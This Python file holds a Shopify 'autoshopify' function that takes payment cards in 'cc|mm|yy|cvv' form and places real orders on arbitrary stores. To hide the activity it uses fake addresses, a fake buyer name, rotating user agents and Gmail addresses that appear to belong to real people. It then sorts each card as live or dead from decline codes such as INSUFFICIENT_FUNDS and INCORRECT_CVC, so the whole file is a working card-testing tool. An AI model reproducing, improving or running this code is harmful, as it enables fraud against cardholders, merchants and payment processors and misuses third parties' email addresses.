import asyncio
import httpx
import re
import json
import time
import random
from urllib.parse import urlparse

# ============================================================
# HELPER FUNCTIONS
# ============================================================

def capture(data, first, last):
    """Extract text between two strings"""
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None


def get_product_id(response):
    """Get cheapest available product from products.json"""
    try:
        response_data = response.json()
        products_data = response_data.get("products", [])
        products = {}
        
        for product in products_data:
            variants = product.get("variants", [])
            for variant in variants:
                product_id = variant.get("id")
                available = variant.get("available", False)
                price_str = variant.get("price", "0")
                
                try:
                    price = float(price_str)
                except:
                    continue
                    
                if price < 0.1:
                    continue
                if available and product_id:
                    products[product_id] = price
                    
        if products:
            min_price_product_id = min(products, key=products.get)
            price = products[min_price_product_id]
            return min_price_product_id, price
            
    except Exception:
        pass
    return None, None


# Country/Currency mappings
C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE",
    "HKD": "HK", "GBP": "GB", "CHF": "CH",
}

ADDRESS_BOOK = {
    "US": {"address1": "123 Main", "city": "NY", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586", "currencyCode": "USD"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198", "currencyCode": "CAD"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123", "currencyCode": "USD"},
    "IN": {"address1": "221B MG", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "9876543210", "currencyCode": "USD"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "", "zoneCode": "DU", "countryCode": "AE", "phone": "501234567", "currencyCode": "USD"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "", "zoneCode": "KL", "countryCode": "HK", "phone": "55555555", "currencyCode": "USD"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345", "currencyCode": "USD"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567", "currencyCode": "USD"},
    "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586", "currencyCode": "USD"},
}


def pick_addr(url, cc=None, rc=None):
    """Pick address based on site/currency/country"""
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    dom = urlparse(url).netloc
    tcn = dom.split('.')[-1].upper()

    if tcn in ADDRESS_BOOK:
        return ADDRESS_BOOK[tcn]

    ccn = C2C.get(cc)

    if rc in ADDRESS_BOOK and ccn == rc:
        return ADDRESS_BOOK[rc]
    elif rc in ADDRESS_BOOK:
        return ADDRESS_BOOK[rc]
    return ADDRESS_BOOK["DEFAULT"]


USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.207 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6312.107 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.207 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.207 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6400.93 Mobile Safari/537.36",
]


def get_random_user_agent():
    return random.choice(USER_AGENTS)


def get_platform(ua):
    if "Android" in ua:
        return "Android"
    elif "iPhone" in ua or "iPad" in ua:
        return "iOS"
    elif "Windows" in ua:
        return "Windows"
    else:
        return "Unknown"


# ============================================================
# MAIN AUTOSHOPIFY FUNCTION
# ============================================================

async def autoshopify(url, card, session):
    """
    Shopify GraphQL Checkout API
    
    Args:
        url: Shopify store URL
        card: Card in format "cc|mm|yy|cvv"
        session: httpx.AsyncClient session
        
    Returns:
        dict with keys: Response, Status, Gateway, Price, cc
    """
    output = {
        "Response": "UNKNOWN ERROR",
        "Status": False,
    }
    
    start = time.time()
    getua = get_random_user_agent()
    clienthint = get_platform(getua)
    gmail = random.choice([
        'shaikhfurkan45107@gmail.com', 'huhagenma@gmail.com', 
        'itzspoooky45107@gmail.com', 'teamsamrat5@gmail.com'
    ])
    mobile = '?1' if any(x in getua for x in ["Android", "iPhone", "iPad", "Mobile"]) else '?0'

    try:
        # Parse URL
        parsed = urlparse(url)
        if parsed.netloc:
            domain = parsed.netloc
        else:
            domain = url.replace("https://", "").replace("http://", "").split("/")[0]
        
        # Parse card
        parts = card.split("|")
        if len(parts) != 4:
            output["Response"] = "INVALID_CARD_FORMAT"
            return output
            
        cc, mes, ano, cvv = [p.strip() for p in parts]
        
        # Format year
        if len(ano) == 2:
            ano = "20" + ano
            
        # Clean URL
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        else:
            url = f"https://{domain}"

        headers = {"User-Agent": getua}

        # ============================================================
        # STEP 1: Get Products
        # ============================================================
        try:
            request = await session.get(f"{url}/products.json", headers=headers, follow_redirects=True, timeout=20)
        except Exception as e:
            output["Response"] = f"SITE_ERROR: {str(e)[:50]}"
            return output

        product_id, price = get_product_id(request)
        if not product_id:
            output["Response"] = "PRODUCT_EMPTY"
            return output

        # ============================================================
        # STEP 2: Get Site Key
        # ============================================================
        try:
            request = await session.get(url, follow_redirects=True, timeout=20)
        except:
            output["Response"] = "SITE_DEAD"
            return output

        site_key = capture(request.text, '"accessToken":"', '"')
        if not site_key:
            output["Response"] = "NO_ACCESS_TOKEN"
            return output

        # ============================================================
        # STEP 3: Create Cart (GraphQL)
        # ============================================================
        cart_headers = {
            'accept': 'application/json',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'origin': url,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': mobile,
            'sec-ch-ua-platform': f'"{clienthint}"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': getua,
            'x-sdk-variant': 'portable-wallets',
            'x-shopify-storefront-access-token': site_key,
            'x-start-wallet-checkout': 'true',
            'x-wallet-name': 'MoreOptions'
        }

        cart_query = {
            'query': 'mutation cartCreate($input:CartInput!$country:CountryCode$language:LanguageCode$withCarrierRates:Boolean=false)@inContext(country:$country language:$language){result:cartCreate(input:$input){...@defer(if:$withCarrierRates){cart{...CartParts}errors:userErrors{...on CartUserError{message field code}}warnings:warnings{...on CartWarning{code}}}}}fragment CartParts on Cart{id checkoutUrl deliveryGroups(first:10 withCarrierRates:$withCarrierRates){edges{node{id groupType selectedDeliveryOption{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}deliveryOptions{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}}}}cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}totalTaxAmount{amount currencyCode}totalDutyAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}discountCodes{code applicable}lines(first:10){edges{node{quantity cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}merchandise{...on ProductVariant{requiresShipping}}sellingPlanAllocation{priceAdjustments{price{amount currencyCode}}sellingPlan{billingPolicy{...on SellingPlanRecurringBillingPolicy{interval intervalCount}}priceAdjustments{orderCount}recurringDeliveries}}}}}}',
            'variables': {
                'input': {
                    'lines': [{'merchandiseId': f'gid://shopify/ProductVariant/{product_id}', 'quantity': 1, 'attributes': []}],
                    'discountCodes': [],
                },
                'country': 'US',
                'language': 'EN',
            },
        }

        try:
            response = await session.post(
                f'{url}/api/unstable/graphql.json',
                params={'operation_name': 'cartCreate'},
                headers=cart_headers,
                json=cart_query,
                timeout=20,
                follow_redirects=True
            )
            response_data = response.json()
            checkout_url = response_data["data"]["result"]["cart"]["checkoutUrl"]
        except Exception as e:
            output["Response"] = f"CART_ERROR: {str(e)[:50]}"
            return output

        await asyncio.sleep(1)

        # ============================================================
        # STEP 4: Get Checkout Page
        # ============================================================
        checkout_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': f'"{clienthint}"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': mobile,
            'upgrade-insecure-requests': '1',
            'user-agent': getua,
        }

        try:
            request = await session.get(
                checkout_url,
                headers=checkout_headers,
                params={'auto_redirect': 'false'},
                follow_redirects=True,
                timeout=20
            )
        except Exception as e:
            output["Response"] = f"CHECKOUT_ERROR: {str(e)[:50]}"
            return output

        checkout_text = request.text

        # Extract checkout tokens
        paymentMethodIdentifier = capture(checkout_text, "paymentMethodIdentifier&quot;:&quot;", "&quot")
        stable_id = capture(checkout_text, "stableId&quot;:&quot;", "&quot")
        queue_token = capture(checkout_text, "queueToken&quot;:&quot;", "&quot")
        currencyCode = capture(checkout_text, "currencyCode&quot;:&quot;", "&quot")
        countryCode = capture(checkout_text, "countryCode&quot;:&quot;", "&quot")
        x_checkout_one_session_token = capture(checkout_text, 'serialized-session-token" content="&quot;', '&quot')
        token = capture(checkout_text, 'serialized-source-token" content="&quot;', '&quot')
        web_build = capture(checkout_text, 'sha&quot;:&quot;', '&quot;') or 'a5ffb15727136fbf537411f8d32d7c41fb371075'
        
        gateway = capture(checkout_text, 'extensibilityDisplayName&quot;:&quot;', '&quot')
        if gateway == "Shopify Payments":
            gateway = "Normal"
        elif not gateway:
            gateway = "Unknown"

        if not x_checkout_one_session_token:
            output["Response"] = "NO_SESSION_TOKEN"
            return output

        # Get address
        addr = pick_addr(url, cc=currencyCode, rc=countryCode)

        # ============================================================
        # STEP 5: Card Tokenization (using deposit.shopifycs.com like original working terminal)
        # ============================================================
        token_headers = {
            'accept': 'application/json',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://deposit.shopifycs.com',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': mobile,
            'sec-ch-ua-platform': f'"{clienthint}"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': getua,
        }

        # Format card number with spaces for tokenization
        formatted_card = " ".join([cc[i:i+4] for i in range(0, len(cc), 4)])
        
        token_payload = {
            'credit_card': {
                'number': formatted_card,
                'month': mes,
                'year': ano,
                'verification_value': cvv,
                'start_month': None,
                'start_year': None,
                'issue_number': '',
                'name': 'Laka Lama',
            },
            'payment_session_scope': f"www.{domain}",
        }

        try:
            request = await session.post(
                'https://deposit.shopifycs.com/sessions',
                headers=token_headers,
                json=token_payload,
                timeout=20
            )
            sessionid = request.json().get("id")
            if not sessionid:
                output["Response"] = "CARD_TOKEN_FAILED"
                return output
        except Exception as e:
            output["Response"] = f"TOKEN_ERROR: {str(e)[:50]}"
            return output

        # ============================================================
        # STEP 6: Proposal Query (Shipping)
        # ============================================================
        proposal_headers = {
            'authority': domain,
            'accept': 'application/json',
            'accept-language': 'en-IN',
            'content-type': 'application/json',
            'origin': url,
            'referer': url,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': mobile,
            'sec-ch-ua-platform': f'"{clienthint}"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'user-agent': getua,
            'x-checkout-one-session-token': x_checkout_one_session_token,
            'x-checkout-web-build-id': web_build,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'yes',
            'x-checkout-web-source-id': token or '',
        }

        proposal_query = {
            'query': '''query Proposal($sessionInput:SessionTokenInput!$queueToken:String$discounts:DiscountTermsInput,$delivery:DeliveryTermsInput,$merchandiseChanges:MerchandiseChangesInput,$payment:PaymentTermInput,$buyerIdentity:BuyerIdentityTermsInput){session(sessionInput:$sessionInput queueToken:$queueToken){sessionToken buyerIdentity{...BuyerIdentityParts}delivery(delivery:$delivery){...DeliveryParts}payment(payment:$payment){...PaymentParts}order{...OrderDetails}receipt{...ReceiptDetails}}}fragment BuyerIdentityParts on BuyerIdentity{buyerIdentity{email firstName lastName phone marketingConsent{value updatedAt}}deliveryAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude}}billingAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude}}}fragment DeliveryParts on Delivery{availableDeliveryCountries{countryCode}deliveryLines{targetMerchandise{...MerchandiseParts}groupType handle selectedDeliveryStrategy{handle title description deliveryMethodTypes}availableDeliveryStrategies{handle title description deliveryMethodTypes cost{amount currencyCode}}}}fragment MerchandiseParts on Merchandise{id variantId productId productHandle title productTitle productType imageUrl quantity sellingPlanId sellingPlanName sellingPlanFrequency options{name value}lineComponents{...LineComponentsItemParts}__typename}fragment LineComponentsItemParts on LineComponentsItem{title quantity imageUrl priceSet{presentmentPrice{amount currencyCode}}}fragment PaymentParts on Payment{availablePayments{paymentMethod{__typename...on DirectPaymentMethod{paymentMethodIdentifier}...on GiftCardPaymentMethod{paymentMethodIdentifier}...on WalletPaymentMethod{name walletParams...on ShopPayPaymentMethod{paymentMethodIdentifier}...on ShopPayInstallmentsPaymentMethod{maxPrice{amount currencyCode}availablePaymentPlans{id interval intervalCount minPrice{amount currencyCode}maxPrice{amount currencyCode}totalMinPrice{amount currencyCode}totalMaxPrice{amount currencyCode}__typename}}...on PayPalPaymentMethod{paymentMethodIdentifier}...on ApplePayPaymentMethod{paymentMethodIdentifier}...on GooglePayPaymentMethod{paymentMethodIdentifier}...on FacebookPayPaymentMethod{paymentMethodIdentifier}...on AmazonPayClassicPaymentMethod{paymentMethodIdentifier}...on AmazonPayPaymentMethod{paymentMethodIdentifier}...on OffSitePaymentMethod{paymentMethodIdentifier name billingAddress{name address1 address2 city countryCode zoneCode postalCode phone}}}...on LocalPaymentMethod{paymentMethodIdentifier localPaymentMethodType}...on CustomPaymentMethod{paymentMethodIdentifier id}...on CustomOnsitePaymentMethod{paymentMethodIdentifier checkoutPaymentMethodId}...on ManualPaymentMethod{paymentMethodIdentifier name additionalDetails instructions}...on DeferredPaymentMethod{displayName orderAttributionHidden deferred{billingCycleType deferDuration interval intervalCount}}...on PaymentOnDeliveryMethod{paymentMethodIdentifier additionalDetails}}}}fragment OrderDetails on Order{order{id}}fragment ReceiptDetails on Receipt{...ProcessedReceipt...ProcessingReceipt...ActionRequiredReceipt...FailedReceipt}fragment ProcessedReceipt on ProcessedReceipt{__typename id orderIdentity{id legacyResourceId}discountedTotalPrice{amount}deliveryLines{deliveryStrategy{handle}}paymentLines{paymentMethodIdentifier amount{amount currencyCode}...GiftCardPaymentLineFragment}orderCreatedSubscription{id live topic success url fields{name value}}dutyTotalPrice{amount currencyCode}shop{primaryDomain{host}storefrontDigitalWalletsEnabled}checkoutCompletedSubscription{id live topic success url fields{name value}}mandates{...ShopPayMandates}}fragment GiftCardPaymentLineFragment on GiftCardPaymentLine{remainingAmount{amount currencyCode}appliedAmount{amount currencyCode}presentmentRemainingAmount{amount currencyCode}presentmentAppliedAmount{amount currencyCode}lastCharacters}fragment ShopPayMandates on ShopPayMandate{mandateId}fragment ProcessingReceipt on ProcessingReceipt{__typename id pollDelay}fragment ActionRequiredReceipt on ActionRequiredReceipt{__typename id action{...on CompletePaymentChallenge{offsiteRedirect url}}paymentLines{paymentMethodIdentifier amount{amount currencyCode}...GiftCardPaymentLineFragment}}fragment FailedReceipt on FailedReceipt{__typename id processingError{...ErrorMessageParts}}fragment ErrorMessageParts on ProcessingError{code messageUntranslated}''',
            'variables': {
                'sessionInput': {'sessionToken': x_checkout_one_session_token},
                'queueToken': queue_token,
                'delivery': {
                    'deliveryAddress': {
                        'firstName': 'Laka',
                        'lastName': 'Lama',
                        'address1': addr["address1"],
                        'address2': '',
                        'city': addr["city"],
                        'postalCode': addr["postalCode"],
                        'countryCode': addr["countryCode"],
                        'zoneCode': addr["zoneCode"],
                        'phone': addr["phone"]
                    }
                },
                'buyerIdentity': {
                    'email': gmail,
                    'marketingConsent': {'value': False, 'updatedAt': None}
                }
            }
        }

        try:
            response = await session.post(
                f'{url}/checkouts/unstable/graphql',
                params={'operationName': 'Proposal'},
                headers=proposal_headers,
                json=proposal_query,
                timeout=30
            )
            proposal_data = response.json()
        except Exception as e:
            output["Response"] = f"PROPOSAL_ERROR: {str(e)[:50]}"
            return output

        # Extract new session token
        try:
            new_session_token = proposal_data["data"]["session"]["sessionToken"]
            x_checkout_one_session_token = new_session_token
        except:
            pass

        # Get shipping handle
        shipping_handle = None
        try:
            delivery = proposal_data["data"]["session"]["delivery"]["deliveryLines"]
            if delivery:
                strategies = delivery[0].get("availableDeliveryStrategies", [])
                if strategies:
                    shipping_handle = strategies[0].get("handle")
        except:
            pass

        await asyncio.sleep(0.5)

        # ============================================================
        # STEP 7: Submit Payment
        # ============================================================
        submit_headers = dict(proposal_headers)
        submit_headers['x-checkout-one-session-token'] = x_checkout_one_session_token

        submit_query = {
            'query': '''mutation SubmitForCompletion($sessionInput:SessionTokenInput!,$queueToken:String,$discounts:DiscountTermsInput,$delivery:DeliveryTermsInput,$merchandiseChanges:MerchandiseChangesInput,$payment:PaymentTermInput,$buyerIdentity:BuyerIdentityTermsInput){session(sessionInput:$sessionInput queueToken:$queueToken){submitForCompletion(payment:$payment delivery:$delivery buyerIdentity:$buyerIdentity){...ReceiptDetails}}}fragment ReceiptDetails on Receipt{...ProcessedReceipt...ProcessingReceipt...ActionRequiredReceipt...FailedReceipt}fragment ProcessedReceipt on ProcessedReceipt{__typename id orderIdentity{id legacyResourceId}discountedTotalPrice{amount}deliveryLines{deliveryStrategy{handle}}paymentLines{paymentMethodIdentifier amount{amount currencyCode}...GiftCardPaymentLineFragment}orderCreatedSubscription{id live topic success url fields{name value}}dutyTotalPrice{amount currencyCode}shop{primaryDomain{host}storefrontDigitalWalletsEnabled}checkoutCompletedSubscription{id live topic success url fields{name value}}mandates{...ShopPayMandates}}fragment GiftCardPaymentLineFragment on GiftCardPaymentLine{remainingAmount{amount currencyCode}appliedAmount{amount currencyCode}presentmentRemainingAmount{amount currencyCode}presentmentAppliedAmount{amount currencyCode}lastCharacters}fragment ShopPayMandates on ShopPayMandate{mandateId}fragment ProcessingReceipt on ProcessingReceipt{__typename id pollDelay}fragment ActionRequiredReceipt on ActionRequiredReceipt{__typename id action{...on CompletePaymentChallenge{offsiteRedirect url}}paymentLines{paymentMethodIdentifier amount{amount currencyCode}...GiftCardPaymentLineFragment}}fragment FailedReceipt on FailedReceipt{__typename id processingError{...ErrorMessageParts}}fragment ErrorMessageParts on ProcessingError{code messageUntranslated}''',
            'variables': {
                'sessionInput': {'sessionToken': x_checkout_one_session_token},
                'queueToken': queue_token,
                'payment': {
                    'totalAmount': {'value': str(price), 'currencyCode': currencyCode or 'USD'},
                    'billingAddress': {
                        'firstName': 'Laka',
                        'lastName': 'Lama',
                        'address1': addr["address1"],
                        'address2': '',
                        'city': addr["city"],
                        'postalCode': addr["postalCode"],
                        'countryCode': addr["countryCode"],
                        'zoneCode': addr["zoneCode"],
                        'phone': addr["phone"]
                    },
                    'paymentLines': [{
                        'paymentMethodIdentifier': paymentMethodIdentifier or 'https://elb.deposit.shopifycs.com/sessions',
                        'paymentSessionId': sessionid
                    }]
                },
                'delivery': {
                    'deliveryAddress': {
                        'firstName': 'Laka',
                        'lastName': 'Lama',
                        'address1': addr["address1"],
                        'address2': '',
                        'city': addr["city"],
                        'postalCode': addr["postalCode"],
                        'countryCode': addr["countryCode"],
                        'zoneCode': addr["zoneCode"],
                        'phone': addr["phone"]
                    },
                    'selectedDeliveryOptions': [{'handle': shipping_handle}] if shipping_handle else []
                },
                'buyerIdentity': {
                    'email': gmail,
                    'marketingConsent': {'value': False, 'updatedAt': None}
                }
            }
        }

        try:
            response = await session.post(
                f'{url}/checkouts/unstable/graphql',
                params={'operationName': 'SubmitForCompletion'},
                headers=submit_headers,
                json=submit_query,
                timeout=30
            )
            submit_text = response.text
            submit_data = response.json()
        except Exception as e:
            output["Response"] = f"SUBMIT_ERROR: {str(e)[:50]}"
            return output

        # ============================================================
        # STEP 8: Parse Response
        # ============================================================
        try:
            receipt = submit_data["data"]["session"]["submitForCompletion"]
            typename = receipt.get("__typename", "")
            receipt_id = receipt.get("id")
            
            if typename == "ProcessedReceipt":
                output.update({
                    "Response": "ORDER_PLACED",
                    "Status": True,
                    "Gateway": gateway,
                    "Price": str(price),
                    "cc": card
                })
                return output
                
            elif typename == "ProcessingReceipt":
                # Need to poll for result
                poll_delay = receipt.get("pollDelay", 2000) / 1000
                await asyncio.sleep(poll_delay)
                
                # Poll for receipt
                poll_query = {
                    'query': '''query PollForReceipt($sessionInput:SessionTokenInput!,$receiptId:ReceiptIdentifier!){session(sessionInput:$sessionInput){receipt(id:$receiptId){...ReceiptDetails}}}fragment ReceiptDetails on Receipt{...ProcessedReceipt...ProcessingReceipt...ActionRequiredReceipt...FailedReceipt}fragment ProcessedReceipt on ProcessedReceipt{__typename id orderIdentity{id legacyResourceId}discountedTotalPrice{amount}deliveryLines{deliveryStrategy{handle}}paymentLines{paymentMethodIdentifier amount{amount currencyCode}...GiftCardPaymentLineFragment}orderCreatedSubscription{id live topic success url fields{name value}}dutyTotalPrice{amount currencyCode}shop{primaryDomain{host}storefrontDigitalWalletsEnabled}checkoutCompletedSubscription{id live topic success url fields{name value}}mandates{...ShopPayMandates}}fragment GiftCardPaymentLineFragment on GiftCardPaymentLine{remainingAmount{amount currencyCode}appliedAmount{amount currencyCode}presentmentRemainingAmount{amount currencyCode}presentmentAppliedAmount{amount currencyCode}lastCharacters}fragment ShopPayMandates on ShopPayMandate{mandateId}fragment ProcessingReceipt on ProcessingReceipt{__typename id pollDelay}fragment ActionRequiredReceipt on ActionRequiredReceipt{__typename id action{...on CompletePaymentChallenge{offsiteRedirect url}}paymentLines{paymentMethodIdentifier amount{amount currencyCode}...GiftCardPaymentLineFragment}}fragment FailedReceipt on FailedReceipt{__typename id processingError{...ErrorMessageParts}}fragment ErrorMessageParts on ProcessingError{code messageUntranslated}''',
                    'variables': {
                        'sessionInput': {'sessionToken': x_checkout_one_session_token},
                        'receiptId': receipt_id
                    }
                }
                
                for _ in range(5):
                    poll_response = await session.post(
                        f'{url}/checkouts/unstable/graphql',
                        params={'operationName': 'PollForReceipt'},
                        headers=submit_headers,
                        json=poll_query,
                        timeout=30
                    )
                    poll_data = poll_response.json()
                    poll_text = poll_response.text
                    
                    try:
                        poll_receipt = poll_data["data"]["session"]["receipt"]
                        poll_typename = poll_receipt.get("__typename", "")
                        
                        if poll_typename == "ProcessedReceipt":
                            output.update({
                                "Response": "ORDER_PLACED",
                                "Status": True,
                                "Gateway": gateway,
                                "Price": str(price),
                                "cc": card
                            })
                            return output
                            
                        elif poll_typename == "FailedReceipt":
                            error = poll_receipt.get("processingError", {})
                            error_code = error.get("code", "UNKNOWN")
                            output.update({
                                "Response": error_code,
                                "Status": True if error_code in ["INSUFFICIENT_FUNDS", "INCORRECT_CVC", "INCORRECT_ZIP"] else False,
                                "Gateway": gateway,
                                "Price": str(price),
                                "cc": card
                            })
                            return output
                            
                        elif poll_typename == "ActionRequiredReceipt":
                            output.update({
                                "Response": "3DS_REQUIRED",
                                "Status": True,
                                "Gateway": gateway,
                                "Price": str(price),
                                "cc": card
                            })
                            return output
                            
                        elif poll_typename == "ProcessingReceipt":
                            await asyncio.sleep(2)
                            continue
                            
                    except:
                        # Parse from text if JSON fails
                        if "CARD_DECLINED" in poll_text:
                            output.update({"Response": "CARD_DECLINED", "Status": False, "Gateway": gateway, "Price": str(price), "cc": card})
                            return output
                        elif "INSUFFICIENT_FUNDS" in poll_text:
                            output.update({"Response": "INSUFFICIENT_FUNDS", "Status": True, "Gateway": gateway, "Price": str(price), "cc": card})
                            return output
                        elif "3DS" in poll_text.upper() or "ACTION" in poll_text.upper():
                            output.update({"Response": "3DS_REQUIRED", "Status": True, "Gateway": gateway, "Price": str(price), "cc": card})
                            return output
                        await asyncio.sleep(2)
                        continue
                        
            elif typename == "ActionRequiredReceipt":
                output.update({
                    "Response": "3DS_REQUIRED",
                    "Status": True,
                    "Gateway": gateway,
                    "Price": str(price),
                    "cc": card
                })
                return output
                
            elif typename == "FailedReceipt":
                error = receipt.get("processingError", {})
                error_code = error.get("code", "UNKNOWN")
                output.update({
                    "Response": error_code,
                    "Status": True if error_code in ["INSUFFICIENT_FUNDS", "INCORRECT_CVC", "INCORRECT_ZIP"] else False,
                    "Gateway": gateway,
                    "Price": str(price),
                    "cc": card
                })
                return output
                
        except Exception as e:
            # Fallback: Parse from raw text
            text_upper = submit_text.upper()
            
            if "PROCESSEDRECEIPT" in text_upper or "ORDER" in text_upper:
                output.update({"Response": "ORDER_PLACED", "Status": True, "Gateway": gateway, "Price": str(price), "cc": card})
            elif "CARD_DECLINED" in text_upper:
                output.update({"Response": "CARD_DECLINED", "Status": False, "Gateway": gateway, "Price": str(price), "cc": card})
            elif "INSUFFICIENT_FUNDS" in text_upper:
                output.update({"Response": "INSUFFICIENT_FUNDS", "Status": True, "Gateway": gateway, "Price": str(price), "cc": card})
            elif "INCORRECT_CVC" in text_upper or "INVALID_CVC" in text_upper:
                output.update({"Response": "INCORRECT_CVC", "Status": True, "Gateway": gateway, "Price": str(price), "cc": card})
            elif "INCORRECT_ZIP" in text_upper:
                output.update({"Response": "INCORRECT_ZIP", "Status": True, "Gateway": gateway, "Price": str(price), "cc": card})
            elif "3DS" in text_upper or "ACTION" in text_upper or "REDIRECT" in text_upper:
                output.update({"Response": "3DS_REQUIRED", "Status": True, "Gateway": gateway, "Price": str(price), "cc": card})
            elif "EXPIRED" in text_upper:
                output.update({"Response": "EXPIRED_CARD", "Status": False, "Gateway": gateway, "Price": str(price), "cc": card})
            elif "FRAUD" in text_upper:
                output.update({"Response": "FRAUD", "Status": False, "Gateway": gateway, "Price": str(price), "cc": card})
            elif "DO_NOT_HONOR" in text_upper:
                output.update({"Response": "DO_NOT_HONOR", "Status": False, "Gateway": gateway, "Price": str(price), "cc": card})
            else:
                output.update({"Response": f"PARSE_ERROR: {str(e)[:30]}", "Status": False, "Gateway": gateway, "Price": str(price), "cc": card})
                
        return output

    except Exception as e:
        output.update({
            "Response": str(e)[:100],
            "Status": False,
        })
        return output
